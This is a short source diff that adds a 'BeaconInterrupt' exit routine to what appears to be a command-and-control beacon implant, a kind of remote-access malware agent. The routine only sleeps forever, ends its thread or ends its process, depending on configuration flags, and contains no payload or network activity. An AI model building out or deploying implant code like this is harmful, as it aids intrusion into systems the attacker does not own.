@@ -50,3 +50,28 @@ BOOL BeaconIsExpired()
 
 	return FALSE;
 }
+
+[[noreturn]] void BeaconInterrupt()
+{
+	if(S_EXIT_FUNK == TRUE)
+	{
+		if (S_CFG_CAUTION == TRUE)
+		{
+			while (TRUE)
+				Sleep(1000);
+		}
+		else
+		{
+			ExitThread(0);
+		}
+	} else {
+		if (S_CFG_CAUTION == TRUE) {
+			HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitProcess, NULL, 0, NULL);
+			WaitForSingleObject(hThread, INFINITE);
+		}
+		else
+		{
+			ExitProcess(0);
+		}
+	}
+}
